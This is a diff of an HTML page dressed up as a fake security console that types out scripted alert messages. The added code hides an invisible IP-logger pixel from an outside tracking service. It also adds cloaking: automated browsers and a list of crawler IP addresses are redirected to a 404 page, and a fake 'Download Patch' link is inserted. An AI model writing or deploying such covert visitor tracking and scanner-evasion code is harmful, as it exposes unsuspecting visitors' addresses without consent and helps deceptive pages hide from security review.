@@ -1,35 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Mirage Shell</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mirage V Console — Adaptive Shell</title>
   <style>
-    body { background: black; color: #00ffaa; font-family: monospace; padding: 20px; }
-    .log-line { margin: 5px 0; }
-    .green { color: #00ff00; }
-    .red { color: #ff4444; }
-    .yellow { color: #ffff66; }
+    body {
+      background-color: #000;
+      color: #00ffcc;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h2 {
+      color: #00ffff;
+    }
+    .log {
+      white-space: pre;
+      color: #00ff00;
+    }
+    a {
+      color: red;
+      font-size: 12px;
+    }
   </style>
 </head>
 <body>
-  <h2>🛡 Mirage V Console — Adaptive Shell</h2>
-  <div id="terminal"></div>
+  <h2>🛡️ Mirage V Console — Adaptive Shell</h2>
+  <div id="terminal" class="log"></div>
+  <br>
+  <a href="#">Download Patch_v4.4.2a</a>
+
+  <!-- 🕵️ Invisible IP Logger -->
+  <img src="https://api.iplogger.org/1px.gif" style="display:none" />
+
   <script>
+    // Logs
     const logs = [
-      "[01:20:01] ✅ PING from 10.0.0.2 acknowledged",
-      "[01:20:03] ⚠️ Unknown header sniffing browser fingerprint",
-      "[01:20:05] ❌ Unauthorized console tampering blocked",
-      "[01:20:08] 👁 Motion spoof active",
-      "[01:20:10] 🧠 Deploying fallback domain...",
+      "[01:20:01] ✅ PING from 10.0.0.24 accepted",
+      "[01:20:03] ⚠️ Unknown header signature detected",
+      "[01:20:05] ❌ Unauthorized sysadmin attempt blocked",
+      "[01:20:08] 🌀 Motion spoof analysis active",
+      "[01:20:10] 🔒 DefenseNet auto-patch injected",
+      "[01:20:12] 🧠 Pattern mirrored to fallback shell"
     ];
-    const term = document.getElementById('terminal');
-    logs.forEach((line, i) => {
-      setTimeout(() => {
-        const div = document.createElement('div');
-        div.className = 'log-line';
-        div.textContent = line;
-        term.appendChild(div);
-      }, i * 1500);
-    });
+
+    let i = 0;
+    const terminal = document.getElementById("terminal");
+
+    function typeLog() {
+      if (i < logs.length) {
+        terminal.innerHTML += logs[i] + "\n";
+        i++;
+        setTimeout(typeLog, 800);
+      }
+    }
+
+    typeLog();
+
+    // 🧠 Bot Fingerprint Detection
+    if (navigator.webdriver || navigator.languages.length === 0) {
+      window.location.href = "/404.html";
+    }
+
+    // 🛑 Bad IP Filter (customize list)
+    fetch('https://api64.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const badIPs = ['66.249.66.1', '17.142.160.59'];
+        if (badIPs.includes(data.ip)) {
+          window.location.href = "/404.html";
+        }
+      });
   </script>
 </body>
 </html>
